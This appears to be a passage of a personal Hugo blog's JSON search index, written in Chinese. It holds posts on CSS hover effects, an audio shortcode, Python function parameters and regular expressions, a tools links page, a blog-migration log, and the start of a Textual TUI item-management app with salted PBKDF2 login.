[{"body":"","link":"https://jackgdn.github.io/","section":"","tags":null,"title":""},{"body":"","link":"https://jackgdn.github.io/tags/-/","section":"tags","tags":null,"title":" "},{"body":"","link":"https://jackgdn.github.io/categories/","section":"categories","tags":null,"title":"Categories"},{"body":"","link":"https://jackgdn.github.io/post/","section":"post","tags":[" "],"title":"Posts"},{"body":"","link":"https://jackgdn.github.io/tags/","section":"tags","tags":null,"title":"Tags"},{"body":"","link":"https://jackgdn.github.io/tags/%E6%97%A5%E5%BF%97/","section":"tags","tags":null,"title":"日志"},{"body":"","link":"https://jackgdn.github.io/categories/%E6%97%A5%E5%BF%97/","section":"categories","tags":null,"title":"日志"},{"body":"我又给 \u0026lt;a\u0026gt; 标签加了一个酷酷的 hover 效果，有下面两种 \u0026lt;a\u0026gt; 标签使用了 hover 效果：\n没有 class 和 title 属性 class 属性中有 nav_item 但没有 nav_brand 我把自定义的效果写成 SASS 格式并写到主题给的 _custom.sass 文件里。\n1a 2 \u0026amp;:not([class]):not([title]) 3 position: relative 4 \u0026amp;:after 5 content: \u0026#39;\u0026#39; 6 position: absolute 7 left: 0 8 bottom: -5px 9 display: inline-block 10 height: 1px 11 background-color: #0077b8 12 width: 0 13 opacity: 0 14 transition: opacity 0.35s, width 0.35s 15 \u0026amp;:hover:after 16 opacity: 1 17 width: 100% 18 \u0026amp;.nav_item:not(.nav_brand) 19 position: relative 20 \u0026amp;:after 21 content: \u0026#39;\u0026#39; 22 position: absolute 23 left: 0 24 bottom: -5px 25 display: inline-block 26 height: 1px 27 background-color: #0077b8 28 width: 0 29 opacity: 0 30 transition: opacity 0.35s, width 0.35s 31 \u0026amp;:hover:after 32 opacity: 1 33 width: 100% 代码块标上 SASS 会导致渲染出错，故标成 CSS。\n","link":"https://jackgdn.github.io/post/log-2024-09-18/","section":"post","tags":["日志"],"title":"日志-2024-09-18"},{"body":"今天心情一般，分享两首歌，同时测试新的 shortcode。 Bury the Light - Victor Borba\rDevil Trigger - Ali Edwards\rshortcode 如下：\r1{{/* audio.html */}} 2 3\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css\u0026#34;\u0026gt; 4 5{{ $link := .Get \u0026#34;link\u0026#34; }} 6{{ $img := .Get \u0026#34;img\u0026#34; }} 7{{ $txt := .Get \u0026#34;txt\u0026#34; }} 8{{ $src := .Get \u0026#34;src\u0026#34; }} 9{{ $uniqueID := .Get \u0026#34;id\u0026#34; }} 10 11\u0026lt;div class=\u0026#34;player\u0026#34; id=\u0026#34;{{ $uniqueID }}\u0026#34;\u0026gt; 12 \u0026lt;div class=\u0026#34;imgBx\u0026#34;\u0026gt; 13 \u0026lt;img src=\u0026#34;{{ $img }}\u0026#34;\u0026gt; 14 \u0026lt;button class=\u0026#34;play-btn\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fas fa-play\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/button\u0026gt; 15 \u0026lt;/div\u0026gt; 16 \u0026lt;div class=\u0026#34;text-content\u0026#34;\u0026gt; 17 \u0026lt;a href=\u0026#34;{{ $link }}\u0026#34; class=\u0026#34;button mt-1\u0026#34; target=\u0026#34;_blank\u0026#34; rel=\u0026#34;noopener noreferrer\u0026#34;\u0026gt;{{ $txt }}\u0026lt;/a\u0026gt; 18 \u0026lt;/div\u0026gt; 19 \u0026lt;audio class=\u0026#34;audio-player\u0026#34;\u0026gt; 20 \u0026lt;source src=\u0026#34;{{ $src }}\u0026#34; type=\u0026#34;audio/mpeg\u0026#34;\u0026gt; 21 \u0026lt;/audio\u0026gt; 22\u0026lt;/div\u0026gt; 23 24\u0026lt;style\u0026gt; 25 .player * { 26 margin: 0; 27 padding: 0; 28 box-sizing: border-box; 29 } 30 .player { 31 width: 300px; 32 background: #0077B8; 33 padding: 20px 14px 8px 14px; 34 border: none; 35 border-radius: 1.5rem; 36 box-shadow: rgba(0, 0, 0, 0.1) 0px 0.25rem 1rem; 37 position: relative; 38 text-align: center; 39 } 40 .imgBx { 41 position: relative; 42 } 43 .imgBx img { 44 width: 100%; 45 height: auto; 46 border: solid; 47 border-radius: 1.5rem; 48 } 49 .text-content { 50 margin: 3px 0; 51 padding: 0.5rem 1.5rem; 52 } 53 .text-content a { 54 color: #ffffff; 55 font-size: 16px; 56 text-decoration: none; 57 } 58 .audio-player { 59 display: none; 60 } 61 .play-btn { 62 background: rgb(0, 119, 184); 63 border: none; 64 border-radius: 50%; 65 width: 50px; 66 height: 50px; 67 font-size: 24px; 68 cursor: pointer; 69 position: absolute; 70 top: 50%; 71 left: 50%; 72 transform: translate(-50%, -50%); 73 z-index: 1; 74 /* 确保按钮在图像上方 */ 75 } 76 .play-btn:hover { 77 background: rgb(0, 53, 83); 78 } 79 .play-btn i { 80 color: #fff; 81 } 82\u0026lt;/style\u0026gt; 83 84\u0026lt;script\u0026gt; 85 (function () { 86 const playerId = \u0026#34;{{ $uniqueID }}\u0026#34;; 87 const audioPlayer = document.querySelector(`#${playerId} .audio-player`); 88 const playButton = document.querySelector(`#${playerId} .play-btn`); 89 playButton.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { 90 if (audioPlayer.paused) { 91 audioPlayer.play(); 92 playButton.innerHTML = \u0026#39;\u0026lt;i class=\u0026#34;fas fa-pause\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026#39;; 93 } else { 94 audioPlayer.pause(); 95 playButton.innerHTML = \u0026#39;\u0026lt;i class=\u0026#34;fas fa-play\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026#39;; 96 } 97 }); 98 audioPlayer.addEventListener(\u0026#39;ended\u0026#39;, () =\u0026gt; { 99 playButton.innerHTML = \u0026#39;\u0026lt;i class=\u0026#34;fas fa-play\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026#39;; 100 }); 101 })(); 102\u0026lt;/script\u0026gt; 主题把 \u0026lt;a\u0026gt; 标签的样式写死了，导致我对 \u0026lt;a\u0026gt; 标签样式的编辑都是徒劳的，因此我不得不使用主题定义的 button 让链接看上去更自然。\n","link":"https://jackgdn.github.io/post/log-2024-09-16/","section":"post","tags":["日志"],"title":"日志-2024-09-16"},{"body":"","link":"https://jackgdn.github.io/tags/python/","section":"tags","tags":null,"title":"Python"},{"body":"必选参数 初学者必会的参数类型，也是 Python 函数参数传递最基础的方式。函数在定义中要求传入，调用时必须传入的参数就是必选参数。\n1def foo(aParam, bParam): 2 print(aParam, bParam) 3 4foo(114514, 1919810) 5 6# output: 114514 1919810 函数定义中要求传入两个参数，那么在调用时就必须传入两个参数，如果出入过多或者过少参数均会报错。\n1def foo(aParam, bParam): 2 print(aParam, bParam) 3 4foo(114514) 5 6\u0026#34;\u0026#34;\u0026#34; 7output: 8Traceback (most recent call last): 9 File \u0026#34;/home/jackgdn/python-script/test.py\u0026#34;, line 4, in \u0026lt;module\u0026gt; 10 foo(114514) 11TypeError: foo() missing 1 required positional argument: \u0026#39;bParam\u0026#39; 12\u0026#34;\u0026#34;\u0026#34; 传入过少参数\n1def foo(aParam, bParam): 2 print(aParam, bParam) 3 4foo(114514, 1919810, \u0026#34;Hello, World!\u0026#34;) 5 6\u0026#34;\u0026#34;\u0026#34; 7Traceback (most recent call last): 8 File \u0026#34;/home/jackgdn/python-script/test.py\u0026#34;, line 4, in \u0026lt;module\u0026gt; 9 foo(114514, 1919810, \u0026#34;Hello, world!\u0026#34;) 10TypeError: foo() takes 2 positional arguments but 3 were given 11\u0026#34;\u0026#34;\u0026#34; 传入过多参数\n默认参数 在定义函数时给出默认值的参数，被称为默认参数。如果在调用函数时传入了默认参数，则默认参数被覆盖为传入的值；若没有传入，则默认参数为默认值。\n1def foo(aParam, bParam=1919810): 2 print(aParam, bParam) 3 4foo(114514) 5 6# output: 114514 1919810 不传入参数，函数使用默认参数\n1def foo(aParam, bParam=1919810): 2 print(aParam, bParam) 3 4foo(114514, \u0026#34;Hello, world!\u0026#34;) 5 6# output: 114514 Hello, world! 重要\n当默认参数为可变对象时，该对象会在函数的多次调用之间公用。\n对于上面这个问题，我们不妨举一个例子：\n1def append_to(element, values=[]): 2 values.append(element) 3 return values 4 5print(append_to(10)) 6print(append_to(20)) 7 8# output: 9# [10] 10# [10, 20] 在这段代码中，values 作为默认参数，默认为一个空列表。当这一函数被多次调用时，上一次得到的函数结果被保留，导致下一次调用函数时，得到的不是我们想要的结果。\n如果想要修复这个 bug，可以将代码改写为下面的形式：\n1def append_to(element, values=None): 2 if values is None: 3 values = list() 4 values.append(element) 5 return values 6 7print(append_to(10)) 8print(append_to(20)) 9 10# output: 11# [10] 12# [20] 可变参数 可变参数在声明函数时一般写作 *args，可变参数的数量时可变的，可以是任意多个（包括 0 个）。可变参数中的所有参数都会存储到一个元组中。\n1def foo(param, *args): 2 print(param) 3 print(type(args)) 4 print(args) 5 6foo(114514, 1919810, \u0026#34;Hello, world!\u0026#34;) 7 8# output: 9# 114514r 10# \u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt; 11# (1919810, \u0026#39;Hello, world!\u0026#39;) 重要\n函数声明时，若可变参数的数量多于一个，程序会抛出 SyntaxError。\n这也很好理解。因为函数会将多个传入的参数存储到一个元组中（如果可变参数数量为 0，则存储到一个空元组中），如果一个函数定义了多个可变参数，则无法区分存入的多个参数应当存入哪一个可变参数\n关键字参数 关键字参数在声明函数中一般写作 **kwargs，在调用函数时，以键值对的格式传入参数，随后键值对会存储为字典格式。和可变参数一样，如果传入的关键字参数数量为 0，则字典为空字典。\n1def foo(param, *args, **kwargs): 2 print(type(param), type(args), type(kwargs)) 3 print(param) 4 print(args) 5 print(kwargs) 6 7foo(141892, 1919810, \u0026#34;Hello, world!\u0026#34;, name=\u0026#39;jack_gdn\u0026#39;, university=\u0026#39;NEFU\u0026#39;) 8 9\u0026#34;\u0026#34;\u0026#34; 10output: 11\u0026lt;class \u0026#39;int\u0026#39;\u0026gt; \u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dict\u0026#39;\u0026gt; 12141892 13(1919810, \u0026#39;Hello, world!\u0026#39;) 14{\u0026#39;name\u0026#39;: \u0026#39;jack_gdn\u0026#39;, \u0026#39;university\u0026#39;: \u0026#39;NEFU\u0026#39;} 15\u0026#34;\u0026#34;\u0026#34; ","link":"https://jackgdn.github.io/post/args-and-kwargs-in-python/","section":"post","tags":["Python"],"title":"Python 中函数的参数"},{"body":"","link":"https://jackgdn.github.io/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","section":"categories","tags":null,"title":"学习记录"},{"body":"","link":"https://jackgdn.github.io/tags/regex/","section":"tags","tags":null,"title":"RegEx"},{"body":"\r正则表达式的编写 交互式学习正则表达式：RegexOne 中文\n正则表达式练习：RegExr\n正则表达式文档：MDN Web Docs 正则表达式\n基础篇 标记\n说明 样例 直接匹配，输入什么匹配什么。 RegEx: abc\nMatch: abc\nMatch: xyzabcdef . 匹配任何单个字符。 RegEx: .a\nMatch: 123abc \\ 转义字符，用于匹配某个用于标记的原始字符。 RegEx: \\.\nMatch: Hi.\nMatch: 3.14 [] 匹配特定范围内的单个字符 RegEx: [abc]an\nMatch: banana\nMatch: abcan [-] 用简略的方式表示范围。例如 [2-6] 等价于 [23456] RegEx: [0-3][a-c]\nMatch: 1a​2b8y9z [^] 排除特定范围内的单个字符 RegEx: b[^e]r\nMatch: barber \\d 匹配 0-9 中的单个数字字符，相当于 [0-9] RegEx: \\da\nMatch: 01a2b34 \\D 匹配单个非数字字符，相当于 [^0-9] RegEx: \\D2\nMatch: 1aa2b34 \\s 匹配单个空白字符，相当于 [\\f\\n\\r\\t\\v\\u0020\\u00a0\\u1680\\u180e\\u2000-\\u200a\\u2028\\u2029\\u202f\\u205f\\u3000\\ufeff]。\n其中，\\f​\\n​\\r​\\t​\\v 与 ASCII 字符集中相同记号的转义字符同义，\\uhhhh 为 Unicode 字符集对应字符的编号。 RegEx: \\s\nMatch: Hello, world! \\S 匹配单个非空白字符，相当于 [^\\f\\n\\r\\t\\v\\u0020\\u00a0\\u1680\\u180e\\u2000-\\u200a\\u2028\\u2029\\u202f\\u205f\\u3000\\ufeff]。 RegEx: \\S\nMatch: H​e​l​l​o​,​ w​o​r​l​d​! \\w 匹配单个单字字符，等价于 [A-Za-z0-9_]。 RegEx: \\w\nMatch: 3.14 \\W 匹配单个非单字字符，等价于 [^A-Za-z0-9_] RegEx: \\W\nMatch: 3.14 \\b 表示单词边界，匹配一个单词的开始或结束，而不匹配任何实际字符。 RegEx: \\bword\\b\nMatch: word and sword \\B 表示非单词边界，匹配字母或数字中间的位置，而不匹配任何实际字符。 RegEx: \\d\\B\\w\\B\nMatch: 01AB\nMatch: A4A2-g74t + 用于匹配 1 个或更多前面的标记。 RegEx: a+b+\nMatch: aaabb * 用于匹配任意多个前面的标记，匹配的前面标记的数量可以为 0。 RegEx: a+b*c\nMatch: aaabbbccc\nMatch: aaaccc ? 用于匹配前一个标记出现 0 次或 1 次。 RegEx: apples?\nMatch: apple\nMatch: appless {} 用于匹配指定数量的前一个标记。 RegEx: \\d{2}\nMatch: Jan 14, 20​05 {,}\n用于匹配指定数量范围的前一个标记，, 后可以为空。当 , 后留空时，则标识匹配前一个标记的最小值。 RegEx: \\d{3,}\nMatch: Jan 14, 2005 ^ 放在标记前，用于匹配开头的字符。 RegEx: ^[Oo]n[Ee]\nMatch: One by onE $ 放在标记后，用于匹配末尾的字符。 RegEx: [Oo]n[Ee]$\nMatch: One by onE | 或，| 前后的条件满足一个即可匹配 RegEx: I love (dogs|cats)\\.\nMatch: I love dogs.\nMatch: I love cats. 进阶篇 捕获组 捕获组用 () 表示，括号中的内容为一组。在一个正则表达式中的捕获组，按照上括号 ( 的顺序进行编号，对于嵌套捕获组同样适用。例如在表达式 ((\\d+) plus )\\d+ 中，捕获组 ((\\d+) plus ) 的编号为 1，而 \\d+ 这一捕获组的编号为 2。\n在正则表达式中，\\ 后直接加一个数字 n 相当于“复制”了第 n 个捕获组，从而允许表达式匹配相同的内容。例如，对于表达式 (\\w{3}) plus \\1 就可以匹配 \u0026quot;one plus one\u0026quot;，\u0026quot;two plus two\u0026quot;，但是无法匹配 \u0026quot;one plus two\u0026quot;。\n如果不想让某个捕获组获得编号，可以在 ( 后加入 ?:，这样捕获组就会成为非捕获组，非捕获组不会获得编号。例如对于 \u0026quot;one plus one, two plus two\u0026quot; 这个字符串中除去 , 之外的内容，可以使用 ((\\w{3}) plus \\2) 匹配，也可以使用 (?:(\\w{3}) plus \\1) 匹配。\n零宽断言 零宽断言有四种，分别是零宽正向先行断言 (?=)（指定后缀）、零宽正向后行断言 (?\u0026lt;=)（指定前缀）、零宽负向先行断言 (?!)（指定后缀不是）、零宽负向后行断言 (?\u0026lt;!)（指定前缀不是）。其中，被指定为或不为前缀或后缀的内容放在零宽断言中下括号 ) 前，先行断言置于标记后，后行断言置于标记前，且零宽断言只用于限定而不参与匹配。\n例如我们想匹配 \u0026quot;hopefully seriously\u0026quot; 这两个单词中 \u0026quot;ly\u0026quot; 前的部分，即 \u0026quot;hopeful\u0026quot; 和 \u0026quot;serious\u0026quot;，就可以使用零宽正向先行断言匹配后缀为 \u0026quot;ly\u0026quot; 的内容，因此我们使用表达式 \\w+(?=ly) 进行匹配，并且 \u0026quot;ly\u0026quot; 并不会被匹配。如果我们想匹配 \u0026quot;Qty.: 100, Price: £150\u0026quot; 中数量 \u0026quot;Qty.\u0026quot; 对应的值，则可使用 (?\u0026lt;!£)\\d{3}\n懒惰匹配 正则表达式默认遵循“贪婪匹配”原则，即尽可能匹配多的字符。例如使用表达式 a\\w+c 匹配字符串 \u0026quot;abcabc\u0026quot; 时，会匹配整个字符串，而非单独某一段 \u0026quot;abc\u0026quot;。如果想让匹配尽量短，则可以使用 “懒惰匹配” 模式。懒惰匹配有如下几种模式：+?（出现至少一次，但是长度尽量短）、*?（出现任意次，但是长度尽量短）、??（至多出现一次，但是长度尽量短）、{,}?（出现指定次数，但是长度尽量短）。\n例如对于字符串 \u0026quot;abcabc\u0026quot;，若需要其匹配为两段 \u0026quot;abc\u0026quot;，则可以使用表达式 a\\w+?c。使用表达式 a\\w{2,7}?c 可以匹配到 \u0026quot;abbbbcabbcabc\u0026quot; 的 \u0026quot;abbbc\u0026quot; 和 \u0026quot;abbc\u0026quot;，而非将 \u0026quot;abbbcabbc\u0026quot; 作为一个整体匹配。\n另外需要注意的是，正则表达式从字符串的开头开始匹配，使用懒惰匹配只会改变匹配到的结尾的位置，而非开头的位置。例如使用 a\\w*?c 匹配字符串 \u0026quot;aaaccc\u0026quot; 会得到 \u0026quot;aaac\u0026quot; 而非 \u0026quot;ac\u0026quot;。\n标志位 到目前为止，本文中出现的所有正则表达式都未使用标志位，而前文中所有的表达式都是默认使用 /g 作为标志位得到的相应的结果。正则表达式中有如下常见标志位：g（global，全局匹配）、i（case intensitive，不区分大小写）、m（multiline，多行匹配）、s（single line，单行匹配）。\n对于上面的正则表达式 a\\w*?c，其完整的写法是 /a\\w*?c/g。例如在匹配 \u0026quot;jack_gdn JackGDN JGDN\u0026quot; 这几个单词时，一个完整的正则表达式是 /j.*?gdn/gi。s 标志位会将多行内容看作一行内容，并且去除 \\n 或 \\r\\n。m 标志位对于 ^ 和 $ 标记格外有用。例如对于一段文本：\n1jack_gdn 2JackGDN 3JGDN 如果使用 /^j.*?gdn/gi 匹配，则只会匹配到第一行的 \u0026quot;jack_gdn\u0026quot;，而如果使用 /^j.*?gdn/gim 匹配，则会将三行内容全部匹配上。\n测试正则表达式 匹配\r匹配结果:\r","link":"https://jackgdn.github.io/post/regex-pt-1/","section":"post","tags":["RegEx"],"title":"正则表达式学习记录（一）——正则表达式的编写"},{"body":" 文档教程 菜鸟教程\nPython 文档\nEsolang\nMarkdown 教程\n实用工具 CodePen\nCompiler Explorer\nConvertio - 文档转换器\nCyberChef\nDeepL 翻译\nDNS Leak Test\nDraw.io\nEasy 6502\nFactordb\nGit History\nIT Tools\nMagic Data 5\nMermaid Live Editor\nPhotopea\nPYC 反编译\nPyinstxtractor WEB\nUnicode Steganography with 0-Width Characters\nVigenere Solver\n博客链接 部分正在维护\nRoATH\rchen04\rhexobd\rChr0n0s\rsfc9982\rlarissa\r","link":"https://jackgdn.github.io/links/","section":"","tags":null,"title":"链接"},{"body":"经过几天的工作，我将个人博客从 Hexo 迁移至 Hugo 基本完成了。在之前，我使用的是 Hexo-Theme-Async 主题。Hexo 和 Hugo 各有优缺点。Hexo 的优点是简单易上手，只需傻瓜式操作就可以快速搭建完一个美观的博客；Hugo 的优点则是生成速度快并且客制化程度高。\n首先就生成速度快来说，运行 hugo server 这条命令的直观感觉就是比 hexo g 与 hexo s 要快很多倍，并且 Hugo 的热重载模式要优于 Hexo。当我修改完一篇文章时，Hugo 可以直接把我修改的内容展示出来，而使用 Hexo 还要重新生成，再加上 Hexo 极慢的生成速度……Hugo 显然更胜一筹。\n这一主题支持多语言版本，我也借此机会学习与专业相关的英语词汇。 转移到 Hugo 上后，原先大气精美的归档页面和友链页面都消失了；交互式网站标题和图标，还有各种有趣的小组件也都不能再使用。取而代之的是一个更简洁、更商务的博客主题。 这后面一段时间，我还需要尽量翻译几篇博客，给博客加入密码和评论的插件。\n","link":"https://jackgdn.github.io/post/log-2024-08-06/","section":"post","tags":["日志"],"title":"日志-2024-08-06"},{"body":" 东北林业大学在读本科生，学习计算机科学与技术专业。\n","link":"https://jackgdn.github.io/about/","section":"","tags":null,"title":"关于我"},{"body":"","link":"https://jackgdn.github.io/categories/python/","section":"categories","tags":null,"title":"Python"},{"body":"项目情况 项目介绍 本项目为一个商品管理应用程序，主要功能是创建、编辑、存储商品信息，同时程序还支持图表视图浏览、密码保护、日志记录等功能。程序使用 Textual 模块创建 TUI（Text-based User Interface，基于文本的用户界面） 程序，用户使用 TUI 与程序交互。我们选择使用 TUI 的理由如下：\n相比于 GUI 程序，TUI 程序可以在没有图形化界面的计算机系统内运行，有较强可移植性；相比于 CLI 程序，TUI 程序更易于用户操作。 用户只需键盘作为输入设备即可与程序交互，若用户使用鼠标则可以获得更佳交互体验。 使用 TUI 作为程序界面的人少之又少，而用于创建 TUI 程序的模块 Textual 的资料更是稀缺。因此，制作 TUI 程序可以体现作者完成这一项目的过程即是学习的过程。 作者个人情怀 程序功能的详细介绍如下：\n权限异常提示。当用户以无读写文件权限的普通用户身份执行程序时，程序会通过 AlertModalScreen 类创建弹窗提醒用户权限不足。此外，为了确保数据安全，程序使用的数据文件、密码存储文件、日志文件的权限均设为 600。 登录模块。登录界面的会根据用户登录状态的不同而显示不同内容（登录界面的可复用性极强，下面三种不同状态下的登录界面都是基于 LoginModalScreen 类创建的）：用户首次登录时，由于没有可用账户，程序会提示用户创建新的账户；有可用账户时，程序会在运行时提示用户登录，登录成功后数据才会加载；用户登录成功后，可以修改密码，修改密码后下次登录使用旧密码则会登录失败。用户名和密码输入框都限制了无法输入空格。用户的用户名及密码使用 PBKDF2 与 SHA256 算法（通过 hashlib.pbkdf2_hmac() 函数实现）进行保护，并加入随机密码盐确保密码不会遭到彩虹表攻击。无论用户在何时注册或者修改密码，也无论用户使用何用户名密码，存储到 logininfo 密码文件中的数据几乎没有重复的可能性。 数据处理模块。这一部分是程序的核心部分。用户在登录后会自动加载已保存的数据并且以组件的形式显示在屏幕上。数据包含商品名称、商品单价、商品数量、商品分区以及商品编号，用户可以编辑每一个商品的相关信息或者删除这些信息。其中，商品名称一栏尽可填写大小写字母、数字以及空格；商品单价一栏仅可输入浮点类型或者整型数据，商品数量一栏仅可输入整型数据；商品分区为一个下拉菜单，其中有十种类别可以选择。编辑后的数据需要用户手动保存，数据存储为 TSV 格式。 日志模块。创建用户、登录、登录失败以及保存文件这四种操作及操作时间会被记录并存储到日志文件中。 以表格视图浏览数据。表格视图可以浏览用户实时编辑的数据而非从已保存的文件中读取数据。在表格视图中，用户可以以商品名称、商品单价、商品数量、商品分区以及商品编号为排序依据对数据进行排序。 切换亮/暗显示模式。 命令托盘。保存数据、修改密码、切换亮/暗显示模式、退出程序、联系作者等命令可以在命令托盘（Command Palette）中查找并执行。 显示时间。 程序运行截图 程序代码 1from textual.screen import ModalScreen, Screen 2from textual.widgets import Label, Button, Input, Select, Header, Footer, DataTable, RichLog 3from textual.containers import Container, Horizontal, Center 4import csv 5import binascii 6import hashlib 7from os import urandom, chmod 8from itertools import cycle 9from rich.text import Text 10from rich.syntax import Syntax 11from textual.widget import Widget 12from textual.reactive import reactive 13from textual.message import Message 14from textual import on, work 15from time import asctime 16from textual.command import Provider, Hit 17from textual.app import App 18from textual.binding import Binding 19from os.path import getsize, exists 20from functools import partial 21 22 23class LoginStatus: 24 25 LOGIN_SUCCESS = 1 26 REQUEST_LOGIN = 2 27 FIRST_TIME_LOGIN = 5 28 REQUEST_CHANGE_PASSWORD = 6 29 EXIT_PROGRAM = 0 30 31 class REQUEST_LOGIN_ALT_TEXT: 32 33 input_box = \u0026#34;Password\u0026#34; 34 password = True 35 label = \u0026#34;Welcome to ItemManagementApp. Please login.\u0026#34; 36 button = \u0026#34;Login\u0026#34; 37 button_id = \u0026#34;login\u0026#34; 38 39 class FIRST_TIME_LOGIN_ALT_TEXT: 40 41 input_box = \u0026#34;Password\u0026#34; 42 password = False 43 label = \u0026#34;No available user detected. Please sign up.\u0026#34; 44 button = \u0026#34;Sign Up\u0026#34; 45 button_id = \u0026#34;first_time_login\u0026#34; 46 47 class REQUEST_CHANGE_PASSWORD_ALT_TEXT: 48 49 input_box = \u0026#34;New Password\u0026#34; 50 password = False 51 label = \u0026#34;You are changing your password.\u0026#34; 52 button = \u0026#34;Submit\u0026#34; 53 button_id = \u0026#34;change_password\u0026#34; 54 55 login_status_alt_text = { 56 REQUEST_LOGIN: REQUEST_LOGIN_ALT_TEXT, 57 FIRST_TIME_LOGIN: FIRST_TIME_LOGIN_ALT_TEXT, 58 REQUEST_CHANGE_PASSWORD: REQUEST_CHANGE_PASSWORD_ALT_TEXT 59 } 60 61 62class AlertModalScreen(ModalScreen): 63 64 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 65 AlertModalScreen { 66 align: center middle; 67 } 68 69 AlertModalScreen \u0026gt; #label { 70 align: center bottom; 71 } 72 73 AlertModalScreen \u0026gt; #button { 74 align: center top; 75 } 76 \u0026#34;\u0026#34;\u0026#34; 77 78 def __init__(self, alert_message): 79 super().__init__() 80 self.alert_message = alert_message 81 82 def compose(self): 83 with Container(id=\u0026#34;label\u0026#34;): 84 yield Label(self.alert_message) 85 yield Label(\u0026#34; \u0026#34;) 86 with Container(id=\u0026#34;button\u0026#34;): 87 yield Button(\u0026#34;OK\u0026#34;) 88 89 def on_button_pressed(self): 90 self.dismiss() 91 92 93class ItemModalScreen(ModalScreen): 94 95 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 96 ItemModalScreen { 97 align: center middle; 98 } 99 100 ItemModalScreen \u0026gt; Container { 101 border: thick $background; 102 background: $boost; 103 width: 50%; 104 height: 76%; 105 } 106 107 ItemModalScreen \u0026gt; Container \u0026gt; Label { 108 width: auto; 109 padding-left: 1; 110 padding-right: 1; 111 } 112 113 ItemModalScreen \u0026gt; Container \u0026gt; * { 114 margin: 1; 115 } 116 117 ItemModalScreen \u0026gt; Container \u0026gt; Horizontal { 118 width: 100%; 119 height: auto; 120 dock: bottom; 121 padding-left: 1; 122 padding-right: 1; 123 margin: 0; 124 } 125 126 ItemModalScreen \u0026gt; Container \u0026gt; Horizontal \u0026gt; #submit { 127 align: left middle; 128 width: 1fr; 129 } 130 131 ItemModalScreen \u0026gt; Container \u0026gt; Horizontal \u0026gt; #cancel { 132 align: right middle; 133 width: 1fr; 134 } 135 \u0026#34;\u0026#34;\u0026#34; 136 137 def compose(self): 138 self.name_input = Input(placeholder=\u0026#34;Name\u0026#34;, restrict=r\u0026#34;^[a-zA-Z0-9\\s]+$\u0026#34;) 139 self.unit_price_input = Input(placeholder=\u0026#34;Unit Price\u0026#34;, type=\u0026#34;number\u0026#34;) 140 self.quantity_input = Input(placeholder=\u0026#34;Quantity\u0026#34;, type=\u0026#34;integer\u0026#34;) 141 self.section_select = Select([ 142 (\u0026#34;Food\u0026#34;, \u0026#34;Food\u0026#34;), 143 (\u0026#34;Clothing\u0026#34;, \u0026#34;Clothing\u0026#34;), 144 (\u0026#34;Shoes \u0026amp; Hats\u0026#34;, \u0026#34;Shoes \u0026amp; Hats\u0026#34;), 145 (\u0026#34;Daily Necessities\u0026#34;, \u0026#34;Daily Necessities\u0026#34;), 146 (\u0026#34;Furniture\u0026#34;, \u0026#34;Furniture\u0026#34;), 147 (\u0026#34;Household Appliances\u0026#34;, \u0026#34;Household Appliances\u0026#34;), 148 (\u0026#34;Textiles\u0026#34;, \u0026#34;Textiles\u0026#34;), 149 (\u0026#34;Hardware Materials\u0026#34;, \u0026#34;Hardware Materials\u0026#34;), 150 (\u0026#34;Electric Materials\u0026#34;, \u0026#34;Electric Materials\u0026#34;), 151 (\u0026#34;Kitchenware\u0026#34;, \u0026#34;Kitchenware\u0026#34;) 152 ]) 153 self.id_number_label = Input(placeholder=\u0026#34;ID\u0026#34;) 154 with Container(): 155 yield Label(\u0026#34;You are adding a new item to the list.\u0026#34;) 156 yield Label(\u0026#34;Name\u0026#34;) 157 yield self.name_input 158 yield Label(\u0026#34;Unit Price\u0026#34;) 159 yield self.unit_price_input 160 yield Label(\u0026#34;Quantity\u0026#34;) 161 yield self.quantity_input 162 yield Label(\u0026#34;Section\u0026#34;) 163 yield self.section_select 164 yield Label(\u0026#34;ID\u0026#34;) 165 yield self.id_number_label 166 with Horizontal(): 167 yield Button(\u0026#34;Submit\u0026#34;, id=\u0026#34;submit\u0026#34;, variant=\u0026#34;success\u0026#34;) 168 yield Label(\u0026#34; \u0026#34;) 169 yield Button(\u0026#34;Cancel\u0026#34;, id=\u0026#34;cancel\u0026#34;, variant=\u0026#34;error\u0026#34;) 170 171 @on(Button.Pressed, \u0026#34;#submit\u0026#34;) 172 def submit_request(self): 173 try: 174 data = ( 175 self.name_input.value, 176 str(round(float(self.unit_price_input.value), 2)), 177 self.quantity_input.value, 178 self.section_select.value, 179 self.id_number_label.value 180 ) 181 self.dismiss(data) 182 183 except Exception: 184 self.dismiss() 185 186 @on(Button.Pressed, \u0026#34;#cancel\u0026#34;) 187 def cancel_request(self): 188 self.dismiss() 189 190 191class LoginModalScreen(ModalScreen): 192 193 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 194 LoginModalScreen { 195 align: center middle; 196 } 197 198 LoginModalScreen \u0026gt; Container { 199 border: thick $background; 200 background: $boost; 201 width: 50%; 202 height: 50%; 203 } 204 205 LoginModalScreen \u0026gt; Container \u0026gt; Label { 206 width: 100%; 207 padding-left: 1; 208 padding-right: 1; 209 } 210 211 LoginModalScreen \u0026gt; Container \u0026gt; * { 212 margin: 1; 213 } 214 215 LoginModalScreen \u0026gt; Container \u0026gt; Horizontal { 216 width: 100%; 217 height: auto; 218 dock: bottom; 219 padding-left: 1; 220 padding-right: 1; 221 margin: 0; 222 } 223 224 LoginModalScreen \u0026gt; Container \u0026gt; Horizontal \u0026gt; #login { 225 align: left middle; 226 width: 1fr; 227 } 228 229 LoginModalScreen \u0026gt; Container \u0026gt; Horizontal \u0026gt; #first_time_login { 230 align: left middle; 231 width: 1fr; 232 } 233 234 LoginModalScreen \u0026gt; Container \u0026gt; Horizontal \u0026gt; #change_password { 235 align: left middle; 236 width: 1fr; 237 } 238 239 LoginModalScreen \u0026gt; Container \u0026gt; Horizontal \u0026gt; #cancel { 240 align: left middle; 241 